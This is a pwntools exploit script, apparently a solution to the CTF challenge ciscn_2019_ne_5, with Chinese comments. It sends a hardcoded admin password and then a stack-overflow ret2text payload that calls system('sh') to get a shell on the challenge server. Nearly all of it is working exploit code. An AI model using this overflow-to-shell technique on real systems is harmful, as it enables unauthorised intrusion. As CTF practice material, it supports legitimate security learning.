'''
@Author       : 白银
@Date         : 2023-04-09 14:42:35
@LastEditors  : 白银
@LastEditTime : 2023-04-09 16:24:25
@FilePath     : /pwn/ciscn_2019_ne_5.py
@Description  : https://buuoj.cn/challenges#ciscn_2019_ne_5
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './ciscn_2019_ne_5'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 27373)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x4c  # ida看上限到r的距离，dest分配了0x48
return_addr = 0x80484D0  # ida找到system函数，进去之后通过; CODE XREF: _system↑j进system的plt，直接左边地址，不要jmp：.plt:080484D0 FF 25 24 A0 04 08             jmp     ds:off_804A024
# ida用shift+f12找到/bin/sh字符串的位置，没有/bin/sh，就找sh字符串的位置，在单词里面就跳过去按u拆开
bin_sh_addr = 0x80482EA

payload1 = flat(['administrator'])
io.sendlineafter('Please input admin password:', payload1)
payload2 = flat(['1'])
io.sendlineafter(':', payload2)
payload3 = flat(['a' * padding, return_addr, 0xdeadbeef, bin_sh_addr]) # x86程序ret2text布置栈帧
io.sendlineafter('Please input new log info:', payload3)
payload4 = flat(['4'])
io.sendlineafter(':', payload4)

io.interactive()
